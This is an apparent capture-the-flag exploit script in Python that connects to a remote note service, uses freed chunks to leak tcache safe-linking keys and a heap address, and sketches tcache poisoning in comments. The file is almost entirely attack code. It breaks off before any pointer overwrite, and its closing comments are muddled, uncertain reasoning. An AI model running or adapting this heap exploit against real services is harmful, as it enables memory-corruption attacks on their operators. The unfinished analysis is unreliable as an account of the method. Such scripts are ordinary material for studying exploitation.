import socket
import time
import struct

def p64(x):
    return struct.pack('<Q', x)

def u64(x):
    return struct.unpack('<Q', x)[0]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect(('pwn.h7tex.com', 42300))

def recv_until(sock, delim):
    buf = b''
    while delim not in buf:
        chunk = sock.recv(1)
        if not chunk:
            break
        buf += chunk
    return buf

def add(idx, data):
    recv_until(s, b'> ')
    s.sendall(b'1\n')
    recv_until(s, b'index: ')
    s.sendall(f'{idx}\n'.encode())
    recv_until(s, b'note: ')
    s.sendall(data)
    time.sleep(0.05)

def delete(idx):
    recv_until(s, b'> ')
    s.sendall(b'2\n')
    recv_until(s, b'index: ')
    s.sendall(f'{idx}\n'.encode())
    time.sleep(0.05)

def edit(idx, data):
    recv_until(s, b'> ')
    s.sendall(b'3\n')
    recv_until(s, b'index: ')
    s.sendall(f'{idx}\n'.encode())
    recv_until(s, b'note: ')
    s.sendall(data)
    time.sleep(0.05)

def view(idx):
    recv_until(s, b'> ')
    s.sendall(b'4\n')
    recv_until(s, b'index: ')
    s.sendall(f'{idx}\n'.encode())
    # view does write(1, notes[idx], 0x50)
    data = b''
    while len(data) < 0x50:
        chunk = s.recv(0x50 - len(data))
        if not chunk:
            break
        data += chunk
    return data

print("[*] Connected!")
print("[*] Allocating chunk 0...")
add(0, b'A' * 0x50)
print("[*] Allocating chunk 1...")
add(1, b'B' * 0x50)

print("[*] Freeing chunk 0...")
delete(0)
print("[*] Freeing chunk 1...")
delete(1)

# Now tcache 0x60 has chunk 1 -> chunk 0 -> NULL
print("[*] Viewing chunk 1 to leak heap key...")
leak1 = view(1)
print("Chunk 1 raw:", leak1[:16])
key = u64(leak1[:8])
print(f"[+] Leaked tcache key (L1 >> 12): 0x{key:x}")

print("[*] Viewing chunk 0 to leak chunk 0 fd...")
leak0 = view(0)
print("Chunk 0 raw:", leak0[:16])
fd0 = u64(leak0[:8])
print(f"[+] Chunk 0 mangled fd: 0x{fd0:x}")

# Let's verify safe linking:
# In chunk 1: fd points to chunk 0.
# So chunk1.fd = (chunk 0 address) ^ (chunk 1 address >> 12).
# In chunk 0: fd points to NULL.
# So chunk0.fd = 0 ^ (chunk 0 address >> 12) = (chunk 0 address >> 12)!
heap_base_chunk0 = fd0 << 12
print(f"[+] Chunk 0 address >> 12: 0x{fd0:x}, base: 0x{heap_base_chunk0:x}")

# Now, we want to poison chunk 1's fd:
# We want chunk 1's next pointer to be TARGET!
# Under safe-linking:
# mangled_target = target ^ (chunk 1 address >> 12)
# Here (chunk 1 address >> 12) is:
# Wait! In chunk 1:
# What was stored in chunk 1?
# chunk 1 was freed LAST!
# So tcache head is chunk 1!
# chunk 1's fd was: (chunk 0 address) ^ (chunk 1 address >> 12) = fd1.
# And chunk 0's fd was: 0 ^ (chunk 0 address >> 12) = chunk 0 address >> 12 = fd0!
# Notice: chunk 0 address = chunk 0 address!
# Since chunk 0 was allocated first, its address is known!
# Let's check the relation:
# chunk 0 and chunk 1 are in the same page or known offset!
# If chunk 0 and chunk 1 are in the same page: (chunk 1 address >> 12) == (chunk 0 address >> 12) == key!
s.close()
